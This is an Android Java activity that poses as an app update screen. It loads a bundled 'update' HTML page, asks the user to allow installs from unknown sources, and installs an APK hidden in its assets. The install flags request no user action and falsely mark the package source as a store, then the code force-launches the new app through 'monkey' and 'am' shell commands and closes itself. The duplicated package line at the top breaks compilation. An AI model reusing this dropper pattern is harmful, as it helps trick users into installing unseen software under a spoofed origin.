package com.example.installer;

package com.example.installer;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.view.WindowInsetsController;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.UUID;

public class MainActivity extends Activity {

    private static final String TAG = "MainActivity";
    private static final String APK_NAME = "plugin.apk";
    private static final int REQUEST_INSTALL = 100;

    private WebView webView;
    private String packageName = null;
    private String mainActivity = null;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isInstalling = false;
    private BroadcastReceiver installReceiver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate: Starting - Android " + Build.VERSION.SDK_INT);

        setupSystemBars();
        setupWebView();
    }

    private void setupWebView() {
        try {
            webView = new WebView(this);
            android.webkit.WebSettings settings = webView.getSettings();
            settings.setJavaScriptEnabled(true);
            settings.setDomStorageEnabled(true);
            settings.setAllowFileAccess(true);
            settings.setAllowContentAccess(true);
            settings.setMediaPlaybackRequiresUserGesture(false);
            settings.setJavaScriptCanOpenWindowsAutomatically(true);

            webView.setWebViewClient(new WebViewClient() {
                @Override
                public void onPageFinished(WebView view, String url) {
                    super.onPageFinished(view, url);
                    Log.d(TAG, "WebView: Page loaded: " + url);
                }
            });

            webView.setWebChromeClient(new WebChromeClient());
            webView.addJavascriptInterface(new WebAppInterface(), "Android");

            setContentView(webView);

            if (checkAssetExists("update/update.html")) {
                webView.loadUrl("file:///android_asset/update/update.html");
            } else {
                showErrorPage();
            }
        } catch (Exception e) {
            Log.e(TAG, "setupWebView: Error", e);
            finish();
        }
    }

    private boolean checkAssetExists(String assetPath) {
        try {
            InputStream inputStream = getAssets().open(assetPath);
            inputStream.close();
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private void showErrorPage() {
        String html = "<!DOCTYPE html><html><head>" +
                "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">" +
                "<style>body{font-family:Arial;text-align:center;padding:50px;background:white;}" +
                "h1{color:#333;}p{color:#666;}</style></head><body>" +
                "<h1>Error</h1><p>Application resources not found.</p></body></html>";
        webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);
    }

    class WebAppInterface {
        @JavascriptInterface
        public void installPlugin() {
            Log.d(TAG, "WebAppInterface: installPlugin called");
            handler.post(new Runnable() {
                @Override
                public void run() {
                    if (!isInstalling) {
                        checkPermission();
                    } else {
                        toast("Installation in progress...");
                    }
                }
            });
        }
    }

    private void checkPermission() {
        Log.d(TAG, "checkPermission: Checking");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!getPackageManager().canRequestPackageInstalls()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, REQUEST_INSTALL);
                } catch (Exception e) {
                    Log.e(TAG, "checkPermission: Error", e);
                    toast("Please enable install from unknown sources");
                }
                return;
            }
        }
        install();
    }

    private void install() {
        Log.d(TAG, "install: Starting");
        if (isInstalling) return;

        isInstalling = true;

        handler.post(new Runnable() {
            @Override
            public void run() {
                if (checkAssetExists("update/installing.html")) {
                    webView.loadUrl("file:///android_asset/update/installing.html");
                }
            }
        });

        new Thread(new Runnable() {
            @Override
            public void run() {
                PackageInstaller.Session session = null;
                File apkFile = null;
                
                try {
                    apkFile = new File(getCacheDir(), "temp_install.apk");
                    if (!copyApkToCache(apkFile)) {
                        throw new Exception("Failed to copy APK");
                    }
                    
                    if (!readApkInfoFromFile(apkFile)) {
                        throw new Exception("Failed to read APK info");
                    }

                    if (packageName == null) {
                        throw new Exception("Package name is null");
                    }

                    Log.d(TAG, "install: Package=" + packageName);

                    PackageInstaller installer = getPackageManager().getPackageInstaller();
                    PackageInstaller.SessionParams params = createSessionParams();
                    
                    int sessionId = installer.createSession(params);
                    Log.d(TAG, "install: Session created: " + sessionId);

                    session = installer.openSession(sessionId);

                    if (!writeApkToSession(session, apkFile)) {
                        throw new Exception("Failed to write APK");
                    }

                    // ✅ ایجاد action یکتا برای هر نصب (بدون package name ثابت)
                    final String uniqueAction = "INSTALL_" + UUID.randomUUID().toString();
                    
                    // ✅ ثبت Dynamic Receiver فقط برای این نصب
                    installReceiver = new BroadcastReceiver() {
                        @Override
                        public void onReceive(Context context, Intent intent) {
                            int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -1);
                            String message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
                            
                            Log.d(TAG, "InstallReceiver: Status=" + status);

                            switch (status) {
                                case PackageInstaller.STATUS_PENDING_USER_ACTION:
                                    Intent confirmIntent = intent.getParcelableExtra(Intent.EXTRA_INTENT);
                                    if (confirmIntent != null) {
                                        try {
                                            confirmIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                            startActivity(confirmIntent);
                                        } catch (Exception e) {
                                            Log.e(TAG, "Error starting confirm intent", e);
                                        }
                                    }
                                    break;

                                case PackageInstaller.STATUS_SUCCESS:
                                    Log.d(TAG, "Installation successful");
                                    handler.post(new Runnable() {
                                        @Override
                                        public void run() {
                                            toast("Installed successfully!");
                                            isInstalling = false;
                                        }
                                    });
                                    handler.postDelayed(new Runnable() {
                                        @Override
                                        public void run() {
                                            forceOpenApp();
                                        }
                                    }, 500);
                                    
                                    // ✅ Unregister بعد از نصب موفق
                                    try {
                                        unregisterReceiver(installReceiver);
                                        Log.d(TAG, "Receiver unregistered after success");
                                    } catch (Exception e) {
                                        Log.w(TAG, "Error unregistering receiver", e);
                                    }
                                    break;

                                case PackageInstaller.STATUS_FAILURE:
                                case PackageInstaller.STATUS_FAILURE_ABORTED:
                                case PackageInstaller.STATUS_FAILURE_BLOCKED:
                                case PackageInstaller.STATUS_FAILURE_CONFLICT:
                                case PackageInstaller.STATUS_FAILURE_INCOMPATIBLE:
                                case PackageInstaller.STATUS_FAILURE_INVALID:
                                case PackageInstaller.STATUS_FAILURE_STORAGE:
                                    Log.e(TAG, "Installation failed: " + message);
                                    handler.post(new Runnable() {
                                        @Override
                                        public void run() {
                                            isInstalling = false;
                                            toast("Installation failed: " + message);
                                            if (webView != null) {
                                                webView.loadUrl("file:///android_asset/update/update.html?error=true");
                                            }
                                        }
                                    });
                                    
                                    // ✅ Unregister بعد از خطا
                                    try {
                                        unregisterReceiver(installReceiver);
                                        Log.d(TAG, "Receiver unregistered after failure");
                                    } catch (Exception e) {
                                        Log.w(TAG, "Error unregistering receiver", e);
                                    }
                                    break;
                            }
                        }
                    };

                    // ✅ ثبت Receiver با action یکتا
                    IntentFilter filter = new IntentFilter(uniqueAction);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        registerReceiver(installReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
                    } else {
                        registerReceiver(installReceiver, filter);
                    }
                    Log.d(TAG, "Receiver registered with action: " + uniqueAction);

                    // ✅ ایجاد PendingIntent با action یکتا
                    Intent intent = new Intent(uniqueAction);
                    
                    int flags = PendingIntent.FLAG_UPDATE_CURRENT;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        flags |= PendingIntent.FLAG_MUTABLE;
                    }

                    PendingIntent pendingIntent = PendingIntent.getBroadcast(
                            MainActivity.this,
                            sessionId,
                            intent,
                            flags);

                    Log.d(TAG, "install: Committing session");
                    session.commit(pendingIntent.getIntentSender());
                    session.close();
                    session = null;
                    
                    Log.d(TAG, "install: Session committed");

                } catch (Exception e) {
                    Log.e(TAG, "install: Error", e);
                    
                    if (session != null) {
                        try {
                            session.abandon();
                            session.close();
                        } catch (Exception ex) {
                            Log.e(TAG, "Error abandoning session", ex);
                        }
                    }
                    
                    final String errorMsg = e.getMessage();
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            isInstalling = false;
                            toast("Installation failed: " + errorMsg);
                            webView.loadUrl("file:///android_asset/update/update.html?error=install");
                        }
                    });
                } finally {
                    if (apkFile != null && apkFile.exists()) {
                        try {
                            apkFile.delete();
                        } catch (Exception e) {
                            Log.w(TAG, "Could not delete temp file", e);
                        }
                    }
                }
            }
        }).start();
    }

    private PackageInstaller.SessionParams createSessionParams() {
        PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            params.setInstallLocation(PackageInfo.INSTALL_LOCATION_INTERNAL_ONLY);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            params.setInstallReason(PackageManager.INSTALL_REASON_USER);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            try {
                params.setPackageSource(PackageInstaller.PACKAGE_SOURCE_STORE);
                params.setRequestUpdateOwnership(true);
            } catch (Exception e) {
                Log.w(TAG, "Could not set Android 14 params", e);
            }
        }

        if (packageName != null) {
            try {
                params.setAppPackageName(packageName);
            } catch (Exception e) {
                Log.w(TAG, "Could not set package name", e);
            }
        }

        return params;
    }

    private boolean copyApkToCache(File targetFile) {
        InputStream in = null;
        OutputStream out = null;
        
        try {
            if (!checkAssetExists(APK_NAME)) {
                return false;
            }

            in = getAssets().open(APK_NAME);
            out = new FileOutputStream(targetFile);

            byte[] buffer = new byte[8192];
            int read;
            
            while ((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
            }
            
            out.flush();
            return targetFile.exists() && targetFile.length() > 0;
            
        } catch (Exception e) {
            Log.e(TAG, "copyApkToCache: Error", e);
            return false;
        } finally {
            try {
                if (in != null) in.close();
                if (out != null) out.close();
            } catch (Exception e) {
                // Ignore
            }
        }
    }

    private boolean readApkInfoFromFile(File apkFile) {
        try {
            if (!apkFile.exists() || apkFile.length() == 0) {
                return false;
            }

            PackageManager pm = getPackageManager();
            
            int flags = PackageManager.GET_ACTIVITIES;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                flags |= PackageManager.GET_SIGNING_CERTIFICATES;
            }

            PackageInfo info = pm.getPackageArchiveInfo(apkFile.getAbsolutePath(), flags);

            if (info == null) {
                return false;
            }

            packageName = info.packageName;
            Log.d(TAG, "Package: " + packageName);

            if (info.activities != null && info.activities.length > 0) {
                mainActivity = info.activities[0].name;
                Log.d(TAG, "MainActivity: " + mainActivity);
            }

            return true;

        } catch (Exception e) {
            Log.e(TAG, "readApkInfoFromFile: Error", e);
            return false;
        }
    }

    private boolean writeApkToSession(PackageInstaller.Session session, File apkFile) {
        InputStream in = null;
        OutputStream out = null;
        
        try {
            in = new FileInputStream(apkFile);
            out = session.openWrite("package", 0, apkFile.length());

            byte[] buffer = new byte[65536];
            int read;
            
            while ((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
            }

            session.fsync(out);
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "writeApkToSession: Error", e);
            return false;
        } finally {
            try {
                if (out != null) out.close();
                if (in != null) in.close();
            } catch (Exception e) {
                // Ignore
            }
        }
    }

    private void forceOpenApp() {
        Log.d(TAG, "forceOpenApp: Starting");
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(800);

                    if (tryOpenWithComponentName() || tryOpenWithLaunchIntent()) {
                        Log.d(TAG, "App opened successfully");
                    } else {
                        tryOpenWithMonkey();
                        tryOpenWithAm();
                    }

                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                                finishAndRemoveTask();
                            } else {
                                finish();
                            }
                        }
                    }, 1000);

                } catch (Exception e) {
                    Log.e(TAG, "forceOpenApp: Error", e);
                }
            }
        }).start();
    }

    private boolean tryOpenWithComponentName() {
        try {
            if (packageName == null || mainActivity == null) return false;

            Intent intent = new Intent();
            intent.setComponent(new ComponentName(packageName, mainActivity));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private boolean tryOpenWithLaunchIntent() {
        try {
            if (packageName == null) return false;

            PackageManager pm = getPackageManager();
            Intent intent = pm.getLaunchIntentForPackage(packageName);

            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                return true;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    private void tryOpenWithMonkey() {
        try {
            if (packageName == null) return;
            Runtime.getRuntime().exec("monkey -p " + packageName + " 1").waitFor();
        } catch (Exception e) {
            // Ignore
        }
    }

    private void tryOpenWithAm() {
        try {
            if (packageName == null || mainActivity == null) return;
            Runtime.getRuntime().exec("am start -n " + packageName + "/" + mainActivity).waitFor();
        } catch (Exception e) {
            // Ignore
        }
    }

    private void setupSystemBars() {
        try {
            android.view.Window window = getWindow();

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                window.setStatusBarColor(Color.WHITE);
                window.setNavigationBarColor(Color.WHITE);

                WindowInsetsController controller = window.getInsetsController();
                if (controller != null) {
                    controller.setSystemBarsAppearance(
                            WindowInsetsController.APPEARANCE_LIGHT_STATUS_BARS,
                            WindowInsetsController.APPEARANCE_LIGHT_STATUS_BARS);
                    controller.setSystemBarsAppearance(
                            WindowInsetsController.APPEARANCE_LIGHT_NAVIGATION_BARS,
                            WindowInsetsController.APPEARANCE_LIGHT_NAVIGATION_BARS);
                }
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                window.setStatusBarColor(Color.WHITE);
                window.setNavigationBarColor(Color.WHITE);

                int flags = window.getDecorView().getSystemUiVisibility();
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    flags |= View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR;
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                    flags |= View.SYSTEM_UI_FLAG_LIGHT_NAVIGATION_BAR;
                }
                window.getDecorView().setSystemUiVisibility(flags);
            }
        } catch (Exception e) {
            Log.e(TAG, "setupSystemBars: Error", e);
        }
    }

    @Override
    public void onBackPressed() {
        try {
            if (webView != null && webView.canGoBack()) {
                webView.goBack();
            } else {
                super.onBackPressed();
            }
        } catch (Exception e) {
            super.onBackPressed();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_INSTALL) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        if (getPackageManager().canRequestPackageInstalls()) {
                            install();
                        } else {
                            toast("Permission required");
                            isInstalling = false;
                            if (webView != null) {
                                webView.loadUrl("file:///android_asset/update/update.html?error=permission");
                            }
                        }
                    }
                }
            }, 300);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        
        try {
            if (installReceiver != null) {
                unregisterReceiver(installReceiver);
                Log.d(TAG, "Receiver unregistered in onDestroy");
            }
        } catch (Exception e) {
            Log.w(TAG, "Error unregistering receiver in onDestroy", e);
        }
        
        try {
            if (webView != null) {
                webView.destroy();
            }
        } catch (Exception e) {
            // Ignore
        }
    }

    private void toast(final String msg) {
        handler.post(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(MainActivity.this, msg, Toast.LENGTH_SHORT).show();
            }
        });
    }
}